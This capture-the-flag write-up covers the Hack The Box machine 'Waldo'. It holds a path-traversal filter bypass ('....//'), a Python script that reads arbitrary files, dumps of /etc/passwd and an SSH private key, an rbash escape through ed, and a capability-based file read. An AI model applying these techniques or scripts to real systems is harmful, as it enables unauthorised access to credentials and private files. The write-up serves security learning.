# Hackthebox Writeup - Waldo
## Enumeration
We will start as usual with enumerating the box to see what ports and services are available using ```nmap```.

```bash
# -sC - run default nmap scripts
# -sV - attempt to grab service version information
# -Pn - do not ping the host before scanning
# -oA nmap/waldo - output results in all formats to nmap/waldo
root@kali:~/ctf/hackthebox/waldo# nmap -sC -sV -Pn -oA nmap/waldo 10.10.10.87
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-26 19:33 EDT
Nmap scan report for 10.10.10.87
Host is up (0.030s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp   open     http           nginx 1.12.2
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about
8888/tcp filtered sun-answerbook

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.23 seconds
```

The filtered port (8888) is interesting.  We cannot do anything with it right now, but it may become useful once we have shell on the box.  It is probably being blocked from us by a firewall.

Let's see what the site looks like:
![main site page](screenshots/1_main_page.PNG)

It appears that the page allows you to add and delete items from lists.  I played around with it for a while to get a feel for how it works, and I also took a look at the source:
![main page source](screenshots/2_page_source.PNG)

The reference to ```list.js``` on line 4 is interesting.  Based on the name, it might be a custom script and not part of a common framework (like jQuery).  Let's see what is in that JavaScript file:
![list.js](screenshots/3_listjs.PNG)

In addition to the functions in the screenshot, there is a third function:
```javascript
function readFile(file){ 
	var xhttp = new XMLHttpRequest();
	xhttp.open("POST","fileRead.php",false);
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send('file=' + file);
	if (xhttp.readyState === 4 && xhttp.status === 200) {
		return xhttp.responseText;
	}else{
	}
}
```

It looks like there are four PHP files behind this application.  With them, we can read files (```fileRead.php```), read directories (```dirRead.php```), write files (```fileWrite.php```), and delete files (```fileDelete.php```).  These pages might allow us to do those operations on arbitrary files and directories.  From the way the JavaScript functions interact with them, we can tell that we have to POST data to them, but the format of the data is not obvious.  To experiment with these pages more and learn about how they work, we can use BurpSuite.

If we set up BurpSuite as an intercepting proxy, we can look at the way the browser sends data to the server.  Here is what an interaction with ```fileRead.php``` looks like:
![fileread.php interaction in burp](screenshots/4_burp_accesslist.PNG)

The data for the ```file``` parameter could be susceptible to directory traversal.  ```dirRead.php``` may be similarly vulnerable by manipulating the ```path``` parameter:
![dirread.php interaction in burp](screenshots/5_burp_dirlist.PNG)

Let's try to read an arbitrary directory by specifying the directory above the current one (```../```):
```bash
curl -X POST --data "path=../" http://10.10.10.87/dirRead.php
```
![dirlist](screenshots/6_attempt_to_read_arbitrary_directory.PNG)
Since we see the PHP files (like ```dirRead.php``` and ```fileRead.php```) in the output, the PHP script is probably filtering strings like ```../```.

Let's try to read ```fileRead.php``` by calling ```fileRead.php```:
```bash
# Leaving the ../ in here to see if fileRead.php filters it as well.
# The echo -e "\n" on the end prints a new line after the output
curl -X POST --data "file=../fileRead.php" http://10.10.10.87/fileRead.php && echo -e "\n"
```
![fileRead.php](screenshots/7_reading_dirread.PNG)

That is a bit unreadable. We can use ```echo -e``` to clean this up by reading the escape sequences such as ```\n``` and ```\t```.
```bash
echo -e "<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application\/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application\/json');\n\t\t$_POST['file'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"\/var\/www\/html\/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"
```

```php
if(['REQUEST_METHOD'] === "POST"){
	['file'] = false;
	header('Content-Type: application\/json');
	if(isset(['file'])){
		header('Content-Type: application\/json');
		['file'] = str_replace( array("..\/", "..\""), "", ['file']);
		if(strpos(['file'], "user.txt") === false){
			 = fopen("\/var\/www\/html\/" . ['file'], "r");
			['file'] = fread(,filesize(['file']));  
			fclose();
		}
	}
	echo json_encode();
}
```
Much better.  So it looks like there is a local file inclusion vulnerability here.  However, there are some things that make this trickier for us.  As we suspected, any instance of ```../``` or ```..\``` is replaced with nothing, and it will only read a file if "user.txt" is not in the string we pass in.  It is similar for ```dirRead.php```.  Let's take a closer look at the line that does the filtering:
```php
['file'] = str_replace( array("..\/", "..\""), "", ['file']);
```
According to the documentation for ```str_replace```<sup>[1]</sup>, the function replaces all instances of the strings passed to it in the source string with the replacement string.  The trick is that the function does not work recursively.  That means that in the call above, "....//" becomes "../".  ```str_replace``` does not go through a second time to replace the resulting ```../```.  Basically, if we want to go up a directory, we just need to specify it this way: ```....//```.  This page<sup>[2]</sup> has other techniques to bypass filters like this.

Using the fact that ```str_replace``` does not work recursively, I wrote a script to read files (prefixed with ```f:``` such as ```f:/etc/passwd```) and directories (prefixed with ```d:``` such as ```d:/home```).

```python
#!/usr/bin/python3

import requests
try:
    import readline
except ImportError:
    pass

if __name__ == '__main__':
    path = input('Enter the absolute path to a file (with f:<file>) or directory (with d:<dir>): ')
    try:
        while True:
            if path.lower() == 'exit':
                break
            
            # fileRead.php and dirRead.php live in /var/www/html, so we need to back up three directories to
            # get to an absolute path.  To back up three directories, we specify ....//....//....// which
            # the PHP scripts filter down to ../../../
            if path.startswith('f:'):
                # path[2:] removes the f: from the front of the string because we do not need it anymore
                parameters = {'file': '....//....//....//' + path[2:]}
                file_request = requests.post('http://10.10.10.87/fileRead.php', data=parameters)
                if file_request.ok:
                    try:
                        file_contents = file_request.json()['file']
                        print(file_contents)
                    except:
                        print('Unexpected response: {}'.format(file_request.text))
                else:
                    print('ERROR ({}): {}'.format(file_request.status_code, file_request.text))
            elif path.startswith('d:'):
                # path[2:] removes the d: from the front of the string because we do not need it anymore
                parameters = {'path': '....//....//....//' + path[2:]}
                path_request = requests.post('http://10.10.10.87/dirRead.php', data=parameters)
                if path_request.ok:
                    try:
                        print(*path_request.json(), sep='\n')
                    except:
                        print('Unexpected response: {}'.format(path_request.text))
                else:
                    print('ERROR ({}): {}'.format(path_request.status_code, path_request.text))

            path = input('Enter the absolute path to a file (with f:<file>) or directory (with d:<dir>): ')
    except KeyboardInterrupt:
        print('\n')
```

Here is some basic enumeration with the script:
```
Enter the absolute path to a file (with f:<file>) or directory (with d:<dir>): f:/etc/passwd

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```
```
Enter the absolute path to a file (with f:<file>) or directory (with d:<dir>): d:/home
.
..
nobody
```

```
Enter the absolute path to a file (with f:<file>) or directory (with d:<dir>): d:/home/nobody
.
..
.ash_history
.ssh
.viminfo
user.txt
```

```
# The PHP script filters out user.txt, so we will have to find another mechanism to get the user flag.
Enter the absolute path to a file (with f:<file>) or directory (with d:<dir>): f:/home/nobody/user.txt
False
```

```
Enter the absolute path to a file (with f:<file>) or directory (with d:<dir>): d:/home/nobody/.ssh
.
..
.monitor
authorized_keys
known_hosts
```

```
Enter the absolute path to a file (with f:<file>) or directory (with d:<dir>): f:/home/nobody/.ssh/.monitor
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
```


When I tried to use the key, I got a bad format error.  The key looks fine on its face, but it actually has a space at the beginning of the last line.  Once we remove that, we can use the key:
```bash
# ssh will complain if the permissions on the key are not read-only
chmod 400 monitor_key
# Even though the key was called monitor, the key is the authorized key for the nobody user
ssh -i monitor_key nobody@10.10.10.87
```
![SSH as nobody](screenshots/8_ssh_as_nobody.PNG)

The user flag is in nobody's home directory (we saw that when we did a directory listing of the directory).

## Owning the Box and the Root Flag
After poking around, it looks like we are stuck in a Docker container.  One way to tell is by looking for a .dockerenv file in ```/```.  There are also other signs such as a docker network interface:
```
docker0   Link encap:Ethernet  HWaddr 02:42:C2:EB:C7:A0  
          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

I tried for about an hour to find something I could escalate with to no avail.  As I was doing my enumeration, I noticed something a bit odd:
```bash
waldo:~$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      
tcp        0      0 10.10.10.87:8888        10.10.14.38:47062       ESTABLISHED 
tcp        0      0 :::80                   :::*                    LISTEN      
tcp        0      0 :::22                   :::*                    LISTEN      
tcp        0      0 :::8888                 :::*                    LISTEN      
udp        0      0 10.10.10.87:42298       10.10.10.2:53           ESTABLISHED 
```
I did not notice this initially, but as I was reviewing what I had gathered, the port I was connected to struck me.  When I SSHed into the box initially, I thought I was SSHed into port 22.  It looks like I actually was connected to port 8888.  Let's see if we can SSH into the host with the key we used to get this far (we do not have any other keys or credentials to try):
```bash
ssh -i ~/.ssh/.monitor 10.10.10.87
```
We got an access denied, but what about with the monitor user?
```bash
ssh -i ~/.ssh/.monitor monitor@10.10.10.87
```
![out of the container?](screenshots/9_ssh_as_monitor_into_host.PNG)

Looks like we may have gotten out of the container.  The line about ```rbash``` suggests we are in a restricted shell.  Most common commands do not exist, and if we look at the ```$PATH```, we see this:
```bash
echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
```
If we look in each of those directories, we can see what commands we have available to us:
```bash
monitor@waldo:~$ ls -al /home/monitor/bin
total 8
dr-xr-x--- 2 root monitor 4096 May  3 16:50 .
drwxr-x--- 5 root monitor 4096 Jul 24 07:58 ..
lrwxrwxrwx 1 root root       7 May  3 16:50 ls -> /bin/ls
lrwxrwxrwx 1 root root      13 May  3 16:50 most -> /usr/bin/most
lrwxrwxrwx 1 root root       7 May  3 16:50 red -> /bin/ed
lrwxrwxrwx 1 root root       9 May  3 16:50 rnano -> /bin/nano
monitor@waldo:~$ ls -al /home/monitor/app-dev
total 2236
drwxrwx--- 3 app-dev monitor    4096 May  3 16:50 .
drwxr-x--- 5 root    monitor    4096 Jul 24 07:58 ..
-rwxrwx--- 1 app-dev monitor   13704 Jul 24 08:10 logMonitor
-r--r----- 1 app-dev monitor   13704 May  3 16:50 logMonitor.bak
-rw-rw---- 1 app-dev monitor    2677 May  3 16:50 logMonitor.c
-rw-rw---- 1 app-dev monitor     488 May  3 16:50 logMonitor.h
-rw-rw---- 1 app-dev monitor 2217712 May  3 16:50 logMonitor.h.gch
-rw-rw---- 1 app-dev monitor    6824 May  3 16:50 logMonitor.o
-rwxr----- 1 app-dev monitor     266 May  3 16:50 makefile
-r-xr-x--- 1 app-dev monitor     795 May  3 16:50 .restrictScript.sh
drwxr-x--- 2 app-dev monitor    4096 May  3 16:50 v0.1
monitor@waldo:~$ ls -al /home/monitor/app-dev/v0.1
total 24
drwxr-x--- 2 app-dev monitor  4096 May  3 16:50 .
drwxrwx--- 3 app-dev monitor  4096 May  3 16:50 ..
-r-xr-x--- 1 app-dev monitor 13706 May  3 16:50 logMonitor-0.1
```

Fortunately, we can use ```ed``` to spawn a shell<sup>[3]</sup>.  It is odd that ```red``` (restricted editor) points to the unrestricted version (```ed```), but we will use that to our advantage.

To spawn a shell inside of ```ed```, we use the ```!``` command which allows us to run a command.  We will run a shell:
```
!'/bin/bash'
```
![unrestricted](screenshots/10_escape_rbash_monitor.PNG)

We can now run commands which we could not before (like ```ps```).  To restore a more traditional path, you can set the ```PATH``` like so:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

I started by looking around at the files inside of /home/monitor/app-dev.  logMonitor.c gave us an idea of what the log monitor program does:
```c
/*******************************************
*
*This is an application to print out common log files
*
********************************************/
```
If we look through the source code, we can see that we can use command line switches to specify one or more files:

![logMonitor source code](screenshots/11_logmonitor_code.PNG)

There are two versions of logMonitor in the folder: ```/home/monitor/app-dev/logMonitor``` and ```/home/monitor/app-dev/v0.1/logMonitor-0.1```.
After playing around with the two versions of logMonitor, I started to notice that the 0.1 version could read files the other one could not:
![logMonitor differences](screenshots/12_differences_between_logmonitor_versions.PNG)

I started to wonder why this was.  The files had essentially the same permissions:
```bash
monitor@waldo:~/app-dev$ ls -al logMonitor
-rwxrwx--- 1 app-dev monitor 13704 Jul 24 08:10 logMonitor
monitor@waldo:~/app-dev$ ls -al v0.1/logMonitor-0.1 
-r-xr-x--- 1 app-dev monitor 13706 May  3 16:50 v0.1/logMonitor-0.1
```
I would expect the 0.1 version had the suid bit set (which would show up as an s in the permissions).  This allows the executable to run as its owner.  A popular executable with the suid bit set is ```passwd```.  It needs to be able to edit the shadow file which is only writable by root.  Therefore, that application has to be able to run with root permissions.

After looking into this for a bit, I discovered a property of the Linux kernel called capabilities.  Capabilities allow administrators to give individual permissions that a superuser would have to a file without having to give all possible superuser permissions.  For example, if you want an application to be able to change the ownership on files arbitrarily, you would normally have to do so as root.  Instead, with capabilities, you could give the application the CAP_CHOWN capability.  This functionality has been around in the kernel since version 2.2 (in 1999).  Let's see the differences in capabilities between the two versions of logMonitor with ```getcap```:

```bash
monitor@waldo:~$ getcap ~/app-dev/v0.1/logMonitor-0.1 
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
monitor@waldo:~$ getcap ~/app-dev/logMonitor 
<No output>
```
It looks like the 0.1 version of logMonitor has the CAP_DAC_READ_SEARCH capability.  According to the capabilities man page<sup>[4]</sup>, that means:

```
CAP_DAC_READ_SEARCH
    Bypass file read permission checks and directory read and execute permission checks. 
```

This would allow us to read an execute any file on the system we want.  For our purposes, that is what we need to get the root flag.  We could probably patch the binary to read the files that we want, but before we do that, let's see if there is an easier way.  With getcap, we can find the capabilities of other files:
```bash
# -r tells getcap to work recursively
# we are going to start at the root of the filesystem (/)
# 2>&1 redirects standard error to standard output.  This makes it easier for us to get rid of lines with information we do not need
# We will pipe the output to grep and tell grep to show us lines without the word "Failed" (-v "Failed").
# Because we redirected standard error to standard output, we can use grep to filter all output.  Lines starting with Failed typically go
# to standard error

monitor@waldo:~$ getcap -r / 2>&1 | grep -v "Failed"
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

It looks like one more file on the filesystem has the ```DAC_READ_SEARCH``` capability.  I had never heard of ```tac``` before, but according to its man page<sup>[5]</sup>, it appears to be cat but in reverse (hence the name).  It allows us to concatenate and print files in reverse.  Right now, we are only interested in one file: the root flag.  Let's see if we can read it:
![root flag](screenshots/13_root_flag.PNG)

We got it!

## References
[1]: http://php.net/manual/en/function.str-replace.php "str_replace Documentation (php.net)"
[2]: https://tipstrickshack.blogspot.com/2013/02/how-to-bypassing-filter-to-traversal_8831.html "Bypassing Filter to Traversal Attacks"
[3]: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ "Restricted Linux Shell Escaping Techniques"
[4]: https://linux.die.net/man/7/capabilities "capabilities man page"
[5]: https://linux.die.net/man/1/tac "tac man page"

  * [<sup>1</sup> str_replace Documentation (php.net)](http://php.net/manual/en/function.str-replace.php)
  * [<sup>2</sup> Bypassing Filter to Traversal Attacks](https://tipstrickshack.blogspot.com/2013/02/how-to-bypassing-filter-to-traversal_8831.html)
  * [<sup>3</sup> Restricted Linux Shell Escaping Techniques](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
  * [<sup>4</sup> capabilities man page](https://linux.die.net/man/7/capabilities)
  * [<sup>5</sup> tac man page](https://linux.die.net/man/1/tac)
